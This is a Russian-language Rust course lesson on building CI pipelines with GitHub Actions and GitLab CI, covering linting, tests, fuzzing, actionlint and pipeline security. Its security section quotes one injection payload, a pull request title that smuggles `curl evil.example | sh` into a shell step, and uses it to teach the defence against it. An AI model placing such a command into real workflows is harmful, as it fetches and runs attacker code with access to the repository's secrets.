<!-- nav:top -->
[🏠 Начало](../START-HERE.md) · [← 09.11 Бенчмарки подробно](11-benchmarking-in-depth.md) · [📋 Этап 09](README.md) · [09.13 Проект: хорошо протестированная библиотека с CI →](13-project-tested-library-with-ci.md) · [📖 Глоссарий](../GLOSSARY.md) · [🇬🇧 English](../../en/09-testing-debugging-benchmarking/12-continuous-integration.md) <!-- nav -->

# Урок 09.12 — Непрерывная интеграция: GitHub Actions и GitLab CI

> **Этап 09 — Тестирование, отладка и бенчмарки** · Урок 12 из 14 · ⏱ около 135 минут

## Что вы узнаете

- Из чего состоит конвейер CI (continuous integration, непрерывная интеграция: сервер, который автоматически собирает и проверяет каждое изменение): рабочий процесс (workflow), триггер, задание (job), шаг, раннер (runner), матрица, кэш и артефакт.
- Как написать полный рабочий процесс GitHub Actions для проекта на Rust: `cargo fmt`, `cargo clippy -D warnings`, тесты, документационные тесты, кэширование и запуск фаззинга по расписанию.
- Как проверить файл рабочего процесса через `actionlint` до отправки и как выполнить те же шаги самостоятельно в чистом контейнере Linux.
- Как выглядит красный конвейер и как его читать.
- Тот же конвейер для GitLab CI и правила безопасных конвейеров (права, закреплённые версии, секреты).

## Перед началом

- Вы прошли [Урок 09.11 — Бенчмарки подробно](11-benchmarking-in-depth.md).
- Из [Урока 01.9](../01-git-and-version-control/09-teamwork-pull-requests-and-conventions.md) вы знаете, что такое CI, как pull request показывает зелёную галочку или красный крестик и какие три проверки стандартны. «Контроль качества» `cargo fmt`, `cargo clippy`, `cargo test` вы знаете из [Урока 05.6](../05-rust-intermediate/06-testing-in-depth.md). Этот урок превращает их в полный, аккуратный конвейер.
- Docker Desktop запущен (раздел 5 использует официальный образ `rust`). Учётная запись GitHub или GitLab полезна, но не обязательна: **конвейеры из этого урока нельзя запустить на вашем Mac**, потому что раннеры живут на серверах GitHub и GitLab. Мы проверяем локально всё, что можно проверить, и ясно говорим, что запустить не удалось.
- Код лежит в `~/projects/rust/code/p09-ci`.

## Новые слова

| Слово | Значение |
|---|---|
| **конвейер** (pipeline) | Весь автоматический процесс, запускаемый для одного изменения: все задания по порядку. В GitHub он называется *запуском рабочего процесса* (workflow run). |
| **рабочий процесс** (workflow) | Файл GitHub Actions в `.github/workflows/`, описывающий, когда и что запускать. |
| **триггер** (`on:`) | Событие, запускающее рабочий процесс: отправка коммитов (push), pull request, расписание, кнопка вручную. |
| **задание** (job) | Группа шагов, выполняемых один за другим на одном раннере. Задания рабочего процесса идут параллельно, пока одно не `needs` другое. |
| **шаг** (step) | Одна команда (`run:`) или одно готовое действие (`uses:`) внутри задания. |
| **действие** (action) | Переиспользуемый шаг, написанный кем-то другим, например `actions/checkout@v7`. |
| **раннер** (runner) | Машина (виртуальная машина или контейнер), выполняющая задание. GitHub и GitLab предоставляют раннеры за вас. |
| **матрица** (matrix) | Способ запустить одно задание с несколькими значениями, например на `ubuntu-latest` и на `macos-latest`. |
| **кэш** (cache) | Файлы, сохраняемые между запусками, чтобы следующий запуск был быстрее, например скачанные крейты и скомпилированные зависимости. |
| **артефакт** (artifact) | Файл, который задание сохраняет, чтобы люди или следующие задания могли его скачать, например файлы падений или отчёт о тестах. |
| **секрет** (secret) | Значение, например токен или пароль, которое система CI хранит для вас и передаёт заданиям, не показывая в логах. |
| **YAML** (YAML Ain't Markup Language, «YAML — не язык разметки») | Текстовый формат файлов CI: вложенные списки и пары «ключ-значение», показанные отступами. |
| **cron** | Краткая запись повторяющихся моментов времени; `17 3 * * 1` означает «в 03:17 каждый понедельник». |
| **MR** (Merge Request, запрос на слияние) | Название pull request в GitLab. |

## 1. Части конвейера

```text
  push / pull request / schedule
              │  (trigger)
              ▼
  ┌───────────── workflow ─────────────────────────────────────┐
  │   job "check"  (runner: ubuntu)    job "check" (macos)     │   run in parallel
  │   1. checkout code                 1. checkout code        │
  │   2. install Rust                  2. install Rust         │
  │   3. restore cache                 ...                     │
  │   4. cargo fmt --check        ──▶ any step exits with a     │
  │   5. cargo clippy ...             non-zero code?            │
  │   6. cargo test                   the job stops: RED        │
  └──────────────────────────────────────────────────────────┘
              ▼
   green tick or red cross next to the pull request
```

Главное правило: **шаг считается проваленным, когда его команда завершается с ненулевым кодом возврата** (*код возврата* — число, которое завершившаяся программа отдаёт командной оболочке; `0` означает успех, любое другое число — неудачу; подробно это объясняет Этап 11). `cargo fmt --check`, `cargo clippy ... -D warnings` и `cargo test` завершаются с ненулевым кодом, когда находят проблему, поэтому задание останавливается и становится красным. Это и есть весь механизм.

## 2. Проект и «контроль качества» на вашем компьютере

Создайте небольшую библиотеку с модульным тестом и документационным тестом и сгенерируйте файл блокировки. (Коммитьте `Cargo.lock` для программ. Для библиотеки это выбор; коммит делает запуски CI повторяемыми, а действие `Swatinem/rust-cache` ниже использует его для ключа кэша.)

```bash
cd ~/projects/rust/code
cargo new --lib p09-ci
cd p09-ci
```

`src/lib.rs`:

```rust
/// Limits a percentage to the range 0 to 100.
///
/// ```
/// assert_eq!(p09_ci::clamp_percent(250), 100);
/// assert_eq!(p09_ci::clamp_percent(40), 40);
/// ```
pub fn clamp_percent(value: u32) -> u32 {
    value.min(100)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn values_above_100_are_cut() {
        assert_eq!(clamp_percent(101), 100);
    }

    #[test]
    fn values_inside_the_range_are_kept() {
        assert_eq!(clamp_percent(0), 0);
        assert_eq!(clamp_percent(100), 100);
    }
}
```

«Контроль качества» — это четыре команды, которые повторит CI. **Сначала запустите их сами**: конвейер должен подтверждать то, что вы уже знаете, а не учить вас чему-то в последний момент.

```bash
cargo fmt --check
cargo clippy --all-targets -- -D warnings
cargo test --all-targets
cargo test --doc
```

Все четыре должны пройти молча или с `ok`. (`--all-targets` также компилирует тесты, примеры и бенчмарки, так что сломанный тест не спрячется. `cargo test --all-targets` не запускает документационные тесты, поэтому `cargo test --doc` — отдельный шаг.)

## 3. Полный рабочий процесс GitHub Actions

Создайте `.github/workflows/ci.yml` в корне репозитория:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

# Cancel an older run of the same branch when a newer commit arrives.
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

# The workflow only needs to read the repository.
permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always

jobs:
  check:
    name: check (${{ matrix.os }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest]
    steps:
      - uses: actions/checkout@v7
      - name: Install the stable toolchain
        run: rustup toolchain install stable --profile minimal --component rustfmt,clippy
      - uses: Swatinem/rust-cache@v2
      - name: Format
        run: cargo fmt --check
      - name: Lint
        run: cargo clippy --all-targets -- -D warnings
      - name: Test
        run: cargo test --all-targets
      - name: Doc tests
        run: cargo test --doc

  benches-build:
    name: benchmarks still compile
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install stable --profile minimal
      - uses: Swatinem/rust-cache@v2
      - run: cargo bench --no-run
```

**Что происходит:**

1. `on:` запускает рабочий процесс при отправке в `main` и для каждого pull request (изменение проверяется до слияния, а `main` — после него).
2. `concurrency` собирает запуски одной ветки в одну группу, а `cancel-in-progress: true` останавливает старый запуск, когда вы отправляете новый коммит. Это экономит время и бесплатные минуты вашей учётной записи.
3. `permissions: contents: read` даёт встроенному токену задания минимально возможные права (раздел 7). Без этой строки у токена могут быть права шире, чем нужно заданию.
4. `env:` задаёт переменную окружения для всех шагов. `CARGO_TERM_COLOR: always` сохраняет цвета в логе, который является обычным файлом, а не терминалом.
5. У задания `check` есть **матрица**: `os: [ubuntu-latest, macos-latest]` создаёт две копии задания. `${{ matrix.os }}` заменяется значением в каждой копии. `fail-fast: false` позволяет второй копии завершиться, даже если первая упала, чтобы вы увидели все проблемы сразу. `${{ ... }}` — синтаксис *выражений* в файлах рабочих процессов.
6. `actions/checkout@v7` скачивает ваш репозиторий на раннер. `@v7` — основная версия действия. (Когда этот урок проверяли, 2026-11-18, самой новой основной версией `actions/checkout` была 7. Версии действий меняются; когда пишете рабочий процесс, смотрите страницу «Releases» каждого действия и обновляйтесь, когда появляется новая основная версия.)
7. На раннерах уже есть `rustup`. Строка `rustup toolchain install stable --profile minimal --component rustfmt,clippy` гарантирует наличие стабильного компилятора, форматировщика и Clippy без тяжёлой документации (`--profile minimal`).
8. `Swatinem/rust-cache@v2` — известное действие сообщества, которое сохраняет `~/.cargo` и `target/` между запусками, используя ключ из `Cargo.lock`, версии компилятора и задания, поэтому второй запуск не перекомпилирует все зависимости. Оно должно стоять **после** шага с тулчейном, потому что ключ включает версию Rust.
9. Четыре шага `run:` — это «контроль качества». У каждого есть `name:`, который виден в логе.
10. Второе задание, `benches-build`, только собирает бенчмарки (`cargo bench --no-run`). Оно их не запускает, потому что числа бенчмарков на общих раннерах — шум (Урок 09.11), но оно следит, чтобы код бенчмарков не перестал компилироваться.

### Рабочий процесс фаззинга по расписанию

Фаззинг (Урок 09.8) не должен задерживать каждый pull request, но должен запускаться регулярно. Поместите это в `.github/workflows/fuzz.yml` (предполагается цель фаззинга из Урока 09.8, `fuzz_target_1`; используйте имя своей цели):

```yaml
name: Fuzz

on:
  schedule:
    - cron: "17 3 * * 1" # every Monday at 03:17 UTC
  workflow_dispatch:

permissions:
  contents: read

jobs:
  fuzz:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install nightly --profile minimal
      - run: cargo install --locked cargo-fuzz
      - name: Fuzz for five minutes
        run: cargo +nightly fuzz run fuzz_target_1 -- -max_total_time=300
      - name: Keep the crash files
        if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: fuzz-artifacts
          path: fuzz/artifacts/
```

**Что происходит:**

1. `schedule` со строкой `cron` запускает рабочий процесс в заданное время (по UTC, Coordinated Universal Time, всемирному координированному времени — мировому стандарту). `workflow_dispatch` добавляет на веб-странице GitHub кнопку «Run workflow», чтобы можно было запустить его вручную.
2. `timeout-minutes: 15` останавливает зависшее задание. Без тайм-аута зависшее задание останавливается лишь через много часов.
3. `-max_total_time=300` — ограничение по времени из Урока 09.8. Фаззер завершается с `0`, когда проходят пять минут без падения, и с ненулевым кодом, когда находит падение.
4. `if: failure()` запускает последний шаг, только если упал более ранний шаг, а `actions/upload-artifact` сохраняет папку `fuzz/artifacts/`. Файл падения можно скачать со страницы запуска и воспроизвести ошибку дома. Иначе файл был бы потерян вместе с раннером.

## 4. Проверяйте рабочий процесс до отправки: `actionlint`

Ошибку в файле рабочего процесса обычно находят только после отправки, по упавшему запуску, через минуту-две. `actionlint` проверяет файл на вашем компьютере за долю секунды: синтаксис YAML, ключи, выражения, имена заданий в `needs` и shell-скрипты в `run:`. Установите его (на Mac через Homebrew, менеджер пакетов из Урока 00.5; или скачайте релиз со страницы проекта), затем запустите из корня репозитория:

```bash
brew install actionlint
actionlint
```

Без аргументов он проверяет все файлы в `.github/workflows/`. Правильный рабочий процесс ничего не печатает и завершается с `0`. Неправильный, с тремя типичными ошибками (`bad.yml`: опечатка в ключе матрицы, `needs` для несуществующего задания и `working_directory` с подчёркиванием):

```text
bad.yml:14:13: property "oss" is not defined in object type {os: string} [expression]
   |
14 |         if: matrix.oss == 'ubuntu-latest'
   |             ^~~~~~~~~~
bad.yml:15:3: job "lint" needs job "tests" which does not exist in this workflow [job-needs]
   |
15 |   lint:
   |   ^~~~~
bad.yml:20:9: unexpected key "working_directory" for step to run shell command. expected one of "continue-on-error", "env", "id", "if", "name", "run", "shell", "timeout-minutes", "working-directory" [syntax-check]
   |
20 |         working_directory: crates
   |         ^~~~~~~~~~~~~~~~~~
```

В каждом сообщении есть файл, строка и столбец, текст и имя проверки в квадратных скобках. Исправляйте по одному. Мы запустили `actionlint` на `ci.yml` и `fuzz.yml` из этого урока: проблем нет.

> 💡 **Совет:** `actionlint` также находит типичные ошибки shell в блоках `run:`, если на вашем компьютере установлен `shellcheck`. Добавьте `actionlint` в Git-хук из Урока 05.6 или запускайте его в самом CI ещё одним заданием.

## 5. Выполните те же шаги в чистом контейнере Linux

Раннер GitHub — чистая машина Linux. Её можно имитировать на Mac с помощью Docker и официального образа `rust`, у которого та же версия компилятора, что и в курсе. Это покажет вам до любой отправки, как выглядит лог красного задания. Сохраните скрипт `runci.sh` (вне проекта; он выполняет четыре шага по одному и останавливается на первой неудаче, как раннер):

```bash
#!/bin/bash
# Mimics the "check" job: every step must exit with 0.
export CARGO_TARGET_DIR=/tmp/target
cd /work || exit 1
rustup component add rustfmt clippy >/dev/null 2>&1
for step in "cargo fmt --check" "cargo clippy --all-targets -- -D warnings" "cargo test --all-targets" "cargo test --doc"; do
  echo "=== Run $step"
  bash -e -c "$step"
  code=$?
  if [ $code -ne 0 ]; then echo "=== Step failed with exit code $code"; exit $code; fi
done
echo "=== all steps passed"
```

Запустите его. Папка проекта подключена только для чтения (`:ro`), поэтому контейнер не может изменить ваши файлы, а `--rm` удаляет контейнер после завершения. (Сначала выполните в проекте `cargo generate-lockfile`, потому что в папке только для чтения нельзя создать новый `Cargo.lock`.)

```bash
chmod +x ~/runci.sh
docker run --rm --name course-ci-green \
  -v ~/projects/rust/code/p09-ci:/work:ro \
  -v ~/runci.sh:/runci.sh:ro \
  rust:1.100 /runci.sh
```

```text
=== Run cargo fmt --check
=== Run cargo clippy --all-targets -- -D warnings
    Checking p09-ci v0.1.0 (/work)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.07s
=== Run cargo test --all-targets
   Compiling p09-ci v0.1.0 (/work)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.24s
     Running unittests src/lib.rs (/tmp/target/debug/build/p09-ci/9172346226d198ab/out/p09_ci-9172346226d198ab)

running 2 tests
test tests::values_above_100_are_cut ... ok
test tests::values_inside_the_range_are_kept ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

=== Run cargo test --doc
   Doc-tests p09_ci
running 1 test
test src/lib.rs - clamp_percent (line 3) ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

=== all steps passed
```

(Сокращено.) Теперь сломайте код тремя разными способами, один за другим, и каждый раз запускайте скрипт. **Поломка 1, форматирование:** запишите заголовок функции как `pub fn clamp_percent(value:u32)->u32{`.

```text
=== Run cargo fmt --check
Diff in /work/src/lib.rs:4:
 /// assert_eq!(p09_ci::clamp_percent(250), 100);
 /// assert_eq!(p09_ci::clamp_percent(40), 40);
 /// ```
-pub fn clamp_percent(value:u32)->u32{
+pub fn clamp_percent(value: u32) -> u32 {
     value.min(100)
 }
 
=== Step failed with exit code 1
```

Строки с `-` — то, что написали вы, строки с `+` — то, чего хочет `rustfmt`. Исправление — `cargo fmt` на вашем компьютере. **Поломка 2, замечание линтера:** напишите `return value.min(100);` вместо последнего выражения.

```text
=== Run cargo clippy --all-targets -- -D warnings
    Checking p09-ci v0.1.0 (/work)
error: unneeded `return` statement
 --> src/lib.rs:8:5
  |
8 |     return value.min(100);
  |     ^^^^^^^^^^^^^^^^^^^^^
  |
  = note: `-D clippy::needless-return` implied by `-D warnings`
help: remove `return`
  |
8 -     return value.min(100);
8 +     value.min(100)
  |

error: could not compile `p09-ci` (lib) due to 1 previous error
=== Step failed with exit code 101
```

(Часть строк опущена.) Без `-D warnings` это было бы только предупреждением, и CI остался бы зелёным. **Поломка 3, ошибка в логике:** напишите `value.min(99)`.

```text
=== Run cargo test --all-targets
running 2 tests
test tests::values_inside_the_range_are_kept ... FAILED
test tests::values_above_100_are_cut ... FAILED

failures:

---- tests::values_inside_the_range_are_kept stdout ----

thread 'tests::values_inside_the_range_are_kept' (151) panicked at src/lib.rs:23:9:
assertion `left == right` failed
  left: 99
 right: 100
...
test result: FAILED. 0 passed; 2 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

error: test failed, to rerun pass `--lib`
=== Step failed with exit code 101
```

**Как выглядит красный конвейер на GitHub.** (Эту часть здесь запустить не удалось, потому что нужен репозиторий на GitHub; она описана по документации GitHub.) На странице pull request в блоке «Checks» каждое задание показано с зелёной галочкой или красным крестиком, например `check (ubuntu-latest)` и `check (macos-latest)`. Вы нажимаете **Details**, и страница показывает шаги задания списком; упавший шаг отмечен красным и раскрыт, а его текст — ровно то, что вы видели выше: `Diff in …`, ошибка clippy или падение теста. Шаги после упавшего показаны как пропущенные. Вы исправляете проблему на своём компьютере, отправляете ещё один коммит, и рабочий процесс запускается снова; `concurrency` отменяет старый запуск.

> 🧪 **Тестирование:** привычка, которую это даёт: **когда CI красный, воспроизведите упавший шаг на своём компьютере** той же командой, исправьте там и отправьте. Не редактируйте файл рабочего процесса десять раз, чтобы «посмотреть, что будет». Если тест падает только в CI, причина часто в различии между машинами: путь, переменная окружения, операционная система, порядок тестов или время.

## 6. Кэширование, скорость и цена CI

У свежего раннера пустая папка `target/`, поэтому первый запуск компилирует все зависимости. `Swatinem/rust-cache` это исправляет. В логе второго запуска его шаг сообщает, что восстановил кэш («cache hit»), а не сохранил новый. Практические замечания:

1. **Кэш — только ускорение.** Конвейер должен работать и с пустым кэшем. Никогда не делайте так, чтобы результат зависел от него.
2. **Ключ кэша важен.** Действие строит его из `Cargo.lock`, версии Rust и имени задания. Когда `Cargo.lock` меняется, старый кэш частично используется, а затем обновляется.
3. **Минуты раннеров стоят денег.** Публичные репозитории на GitHub работают бесплатно, у приватных есть месячная квота, а минуты macOS стоят дороже. Матрица с `macos-latest` полезна, когда ваш код зависит от платформы; если нет, достаточно задания `ubuntu-latest`.
4. **Быстрые проверки — первыми.** `cargo fmt --check` занимает секунду, поэтому ошибка форматирования роняет задание до начала долгой компиляции. Порядок в нашем задании (fmt, clippy, test) ставит дешёвые шаги вперёд.
5. **Разделите медленный конвейер.** Если тесты становятся медленными, запускайте их отдельным заданием от линтеров, чтобы быстрая обратная связь приходила раньше.

> ⚡ **Производительность:** чтобы увидеть, сколько занял каждый шаг, откройте запуск в GitHub: у каждого шага показано время. Действует то же правило, что в Уроке 09.11: найдите медленный шаг, прежде чем оптимизировать конвейер.

## 7. Безопасные конвейеры

Задание CI выполняет код на машине, которая может добраться до ваших секретов. Относитесь к файлу рабочего процесса как к продакшен-коду.

1. **Минимальные права.** `permissions: contents: read` вверху. Давайте заданию больше, только когда оно нужно (например, `pull-requests: write`, чтобы оставить комментарий).
2. **Закрепляйте то, чем пользуетесь.** `actions/checkout@v7` следует основной версии, и это хороший вариант по умолчанию для официальных действий. Для сторонних действий (таких, как `Swatinem/rust-cache`) те, кому нужна самая сильная защита, закрепляют полный хеш коммита (`uses: owner/action@<хеш из 40 символов>`), потому что тег автор может переместить. Инструмент вроде Dependabot может обновлять закреплённые версии за вас.
3. **Секреты.** Храните их в настройках репозитория в разделе *Secrets and variables → Actions* и используйте как `${{ secrets.NAME }}`. Никогда не пишите их в файл YAML, никогда не печатайте через `echo`, никогда не кладите в `Cargo.toml`. GitHub скрывает известные секреты в логах, но не может скрыть их преобразованную копию.
4. **Pull request из форков.** Pull request из чужой копии репозитория не получает секретов и получает токен только для чтения. Это правильно: иначе посторонний мог бы написать pull request, печатающий ваши секреты. Осторожнее с триггером `pull_request_target`, который доступ даёт; не используйте его, пока не поймёте риск.
5. **Никогда не вставляйте недоверенный текст в команду оболочки.** Выражение вроде `run: echo "${{ github.event.pull_request.title }}"` подставляет заголовок в скрипт до запуска оболочки, поэтому заголовок вида `"; curl evil.example | sh; "` становится командой. Передавайте такие значения через переменную окружения (`env: TITLE: ${{ github.event.pull_request.title }}`, затем `echo "$TITLE"`).
6. **Зависимости — тоже поверхность атаки.** На Этапе 10 вы добавите `cargo audit` и `cargo deny` как дополнительные шаги CI для проверки крейтов на известные уязвимости.

## 8. Тот же конвейер в GitLab CI

У GitLab собственная система, настраиваемая одним файлом `.gitlab-ci.yml` в корне репозитория. Идеи те же, названия другие:

| GitHub Actions | GitLab CI |
|---|---|
| файл рабочего процесса в `.github/workflows/` | один файл `.gitlab-ci.yml` |
| `on:` | `workflow: rules:` и `rules:` каждого задания |
| задание (job) | задание (ключ верхнего уровня со `script:`) |
| шаг (step) | строка в `script:` |
| `runs-on:` | `image:` (образ Docker) или `tags:` раннера |
| `actions/cache` | `cache:` |
| `actions/upload-artifact` | `artifacts:` |
| pull request | запрос на слияние (merge request, MR) |
| секреты | переменные CI/CD (continuous integration / continuous delivery, непрерывная интеграция / непрерывная доставка; masked) |

Этот файл написан по документации GitLab (docs.gitlab.com, страницы «CI/CD YAML syntax reference» и «Caching»). **Здесь он не запускался**, потому что раннеры GitLab недоступны на этом Mac. Мы проверили только, что это корректный YAML. Проверьте его на настоящем проекте и прочитайте лог первого конвейера.

```yaml
image: rust:1.100

variables:
  CARGO_HOME: "$CI_PROJECT_DIR/.cargo"
  CARGO_TERM_COLOR: always

# Run for merge requests and for the default branch only.
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

stages:
  - check
  - test

# The cache key changes when Cargo.lock changes.
cache:
  key:
    files:
      - Cargo.lock
  paths:
    - .cargo/registry/
    - target/

fmt:
  stage: check
  script:
    - rustup component add rustfmt
    - cargo fmt --check

clippy:
  stage: check
  script:
    - rustup component add clippy
    - cargo clippy --all-targets -- -D warnings

test:
  stage: test
  script:
    - cargo test --all-targets
    - cargo test --doc
```

**Что происходит:**

1. `image: rust:1.100` запускает каждое задание в официальном образе Rust (в том же, что мы использовали в разделе 5). Задание стартует в чистом контейнере, поэтому инструменты нужно устанавливать в самом задании (`rustup component add …`).
2. `workflow: rules:` решает, создавать ли конвейер вообще: для запроса на слияние или для отправки в ветку по умолчанию. Без этого GitLab запускал бы дублирующий конвейер для ветки с открытым запросом на слияние.
3. `stages` задают порядок: оба задания стадии `check` (`fmt` и `clippy`) идут параллельно, и только если оба прошли, начинается стадия `test`.
4. `paths` кэша должны лежать внутри каталога проекта. Поэтому `CARGO_HOME` перенесён в проект (`$CI_PROJECT_DIR/.cargo`): по умолчанию Cargo хранит скачанные крейты в `~/.cargo`, который GitLab кэшировать не может. `key: files: [Cargo.lock]` создаёт новый кэш при изменении файла блокировки.
5. GitLab показывает конвейер как ряд цветных блоков по стадиям на странице *Pipelines*; красный блок задания открывает лог с тем же текстом, что в разделе 5. Кэш — ускорение, а артефакты — результаты, которые вы сохраняете (`artifacts:` — аналог `actions/upload-artifact`).

## Частые ошибки

**1. Табуляция или неверные отступы в YAML.** Файл невалиден, или задание молча оказывается не там. Используйте только пробелы, по два на уровень, и запускайте `actionlint`.

**2. Проверка, которая не может упасть.** `cargo clippy` без `-D warnings` лишь печатает предупреждения и завершается с `0`; конвейер остаётся зелёным. Используйте `-- -D warnings`.

**3. Кэш до тулчейна.** Ключ кэша включает версию Rust. Сначала установите тулчейн, затем восстановите кэш.

**4. Конвейер, который работает только с тёплым кэшем или только на вашем Mac.** Запустите шаги в чистом контейнере (раздел 5), чтобы найти скрытые зависимости от вашей машины.

**5. Секреты в репозитории.** Токен, закоммиченный один раз, остаётся в истории Git, даже если файл удалить (старые коммиты всё ещё его содержат). Если это случилось, считайте секрет утёкшим и замените его.

**6. Запуск бенчмарков как проверки «прошло/не прошло» на общем раннере.** Числа — шум. Собирайте их (`--no-run`), не судите по их скорости.

## Попробуйте сами

1. Создайте `code/p09-ci` с библиотекой из раздела 2 и запустите четыре команды «контроля качества».
2. Добавьте `.github/workflows/ci.yml` и `fuzz.yml` и запустите `actionlint`. Затем внесите опечатку (`runs_on`) и прочитайте сообщение. Уберите её.
3. Запустите скрипт с контейнером из раздела 5 в зелёном состоянии и с каждой из трёх поломок.
4. (По желанию, нужна учётная запись.) Отправьте проект в новый приватный репозиторий GitHub и откройте pull request, ломающий форматирование. Посмотрите на упавшую проверку, исправьте и увидьте, как она станет зелёной.

## Упражнения

### Упражнение 1 — Прочитать лог (легко)

В логе написано `Diff in /work/src/lib.rs:4:` и показаны строка с `-` и строка с `+`. Какая команда исправляет это на вашем компьютере и запускает ли её за вас CI?

<details>
<summary>Подсказка</summary>

`cargo fmt --check` только проверяет. Есть вариант без `--check`.

</details>

<details>
<summary>Ответ</summary>

`cargo fmt` переписывает файлы в стандартном формате. CI её **не** запускает; он запускает `cargo fmt --check`, которая падает и печатает разницу. Исправляете вы: выполните `cargo fmt`, проверьте через `git diff` и закоммитьте.

Почему это работает: задание CI не должно молча менять код, потому что изменение существовало бы только на раннере и пропало. CI только сообщает; исправляют люди.

</details>

### Упражнение 2 — Тест, охраняющий границу (средне)

Добавьте в `src/lib.rs` тест `zero_stays_zero` для `clamp_percent(0)` и тест `max_value_is_cut` для `u32::MAX`. Затем запустите зелёный «контроль качества». Какой из четырёх шагов запускает ваши новые тесты?

<details>
<summary>Подсказка</summary>

Модульные тесты в `mod tests` запускает `cargo test --all-targets`; документационные тесты запускает `cargo test --doc`.

</details>

<details>
<summary>Ответ</summary>

```rust
    #[test]
    fn zero_stays_zero() {
        assert_eq!(clamp_percent(0), 0);
    }

    #[test]
    fn max_value_is_cut() {
        assert_eq!(clamp_percent(u32::MAX), 100);
    }
```

Их запускает шаг `cargo test --all-targets` (проходят 4 теста: 2 старых и 2 новых). Шаг `cargo test --doc` запускает только пример в комментарии `///`.

Почему это работает: `value.min(100)` возвращает меньшее из двух чисел, то есть 100 для `u32::MAX` и 0 для 0.

</details>

### Упражнение 3 — Добавить задание (сложно)

Напишите для `ci.yml` третье задание `docs`, которое собирает документацию и падает на предупреждениях документации (например, на битой ссылке в комментарии `///`). Используйте `RUSTDOCFLAGS: -D warnings` и `cargo doc --no-deps`. Проверьте файл через `actionlint`.

<details>
<summary>Подсказка</summary>

Переменные окружения для одного задания задаются в `env:` на уровне задания. Структура та же, что у `benches-build`: checkout, тулчейн, кэш, один `run`.

</details>

<details>
<summary>Ответ</summary>

Добавьте в `jobs:`:

```yaml
  docs:
    name: documentation builds
    runs-on: ubuntu-latest
    env:
      RUSTDOCFLAGS: -D warnings
    steps:
      - uses: actions/checkout@v7
      - run: rustup toolchain install stable --profile minimal
      - uses: Swatinem/rust-cache@v2
      - run: cargo doc --no-deps
```

`actionlint` ничего не печатает. Чтобы увидеть падение, добавьте к `clamp_percent` комментарий `/// See [missing_item].` и выполните локально `RUSTDOCFLAGS="-D warnings" cargo doc --no-deps`: rustdoc сообщает о неразрешённой ссылке как о предупреждении, а `-D warnings` превращает его в ошибку с ненулевым кодом возврата:

```text
error: unresolved link to `missing_item`
 --> src/lib.rs:1:53
  |
1 | /// Limits a percentage to the range 0 to 100. See [missing_item].
  |                                                     ^^^^^^^^^^^^ no item named `missing_item` in scope
  |
  = note: `-D rustdoc::broken-intra-doc-links` implied by `-D warnings`

error: could not document `p09-ci`
```

Почему это работает: `RUSTDOCFLAGS` передаёт флаги в `rustdoc`, инструмент за `cargo doc`, так же как `RUSTFLAGS` — компилятору.

</details>

## Вопросы для самопроверки

1. Когда шаг CI считается проваленным?

<details>
<summary>Ответ</summary>

Когда его команда завершается с ненулевым кодом возврата. Задание останавливается и становится красным.

</details>

2. Зачем в `ci.yml` у матрицы стоит `fail-fast: false`?

<details>
<summary>Ответ</summary>

Чтобы остальные копии матрицы завершались, даже если одна упала. Вы видите падения на всех системах за один запуск.

</details>

3. Почему конвейер должен работать с пустым кэшем?

<details>
<summary>Ответ</summary>

Кэш — только ускорение. Он может быть вытеснен, отсутствовать для новой ветки или оказаться повреждённым; конвейер, зависящий от него, ненадёжен.

</details>

4. От чего защищает `permissions: contents: read`?

<details>
<summary>Ответ</summary>

Он ограничивает права встроенного токена. Если шаг скомпрометирован (например, вредоносной зависимостью или действием), токен не сможет отправить код или изменить репозиторий.

</details>

5. Чем опасна строка `run: echo "${{ github.event.pull_request.title }}"`?

<details>
<summary>Ответ</summary>

Выражение заменяется текстом заголовка до запуска оболочки, поэтому заголовок с синтаксисом оболочки становится командой (внедрение). Передавайте значение в переменной `env:` и используйте `"$TITLE"`.

</details>

6. Какой инструмент проверяет файл рабочего процесса на вашем компьютере и что он проверяет?

<details>
<summary>Ответ</summary>

`actionlint`. Он проверяет синтаксис YAML, ключи шагов и заданий, выражения, имена в `needs` и (при наличии `shellcheck`) shell-скрипты.

</details>

## Итоги

- Конвейер запускается событием и выполняет задания из шагов на раннерах. Шаг падает при ненулевом коде возврата; один красный шаг делает красным задание.
- «Контроль качества» Rust для CI: `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test --all-targets` и `cargo test --doc`. Сначала запускайте его на своём компьютере.
- В хорошем рабочем процессе GitHub есть: триггеры `push` и `pull_request`, `concurrency`, минимальные `permissions`, шаг с тулчейном, `Swatinem/rust-cache@v2` и именованные шаги. Рабочий процесс по расписанию запускает фаззинг; бенчмарки только собираются.
- Проверяйте файлы рабочих процессов через `actionlint`; красный шаг воспроизводите в чистом контейнере, прежде чем править файл.
- Относитесь к рабочему процессу как к продакшен-коду: минимальные права, закреплённые версии, секреты в хранилище секретов, никакого недоверенного текста в командах оболочки.
- В GitLab CI те же идеи в одном `.gitlab-ci.yml`: `image`, `stages`, `script`, `cache`, `rules`. Файл GitLab из этого урока написан по документации и здесь не запускался.

## Источники и что почитать

- [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions) — каждый ключ файла рабочего процесса: `on`, `jobs`, `strategy`, `concurrency`, `permissions`.
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) — секреты, закрепление версий, внедрение в скрипты и права токена.
- [actionlint](https://github.com/rhysd/actionlint) — проверяющий файлов рабочих процессов, со списком всех проверок.
